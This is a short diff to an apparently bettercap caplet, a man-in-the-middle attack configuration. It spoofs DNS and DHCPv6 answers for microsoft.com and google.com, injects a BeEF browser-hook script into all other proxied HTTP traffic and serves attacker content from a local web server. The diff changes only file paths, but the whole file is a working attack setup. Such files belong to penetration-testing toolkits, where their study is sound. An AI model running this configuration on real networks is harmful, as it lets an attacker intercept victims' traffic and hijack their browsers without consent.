@@ -2,11 +2,11 @@
 set dns.spoof.domains microsoft.com, google.com
 set dhcp6.spoof.domains microsoft.com, google.com
 # and let's inject a beef hook into everything else ^_^
-set http.proxy.script caplets/beef-inject.js
+set http.proxy.script beef-inject.js
 
 # every http request to the spoofed hosts will come to us
 # let's give em some contents
-set http.server.path caplets/www
+set http.server.path www
 
 # serve files
 http.server on
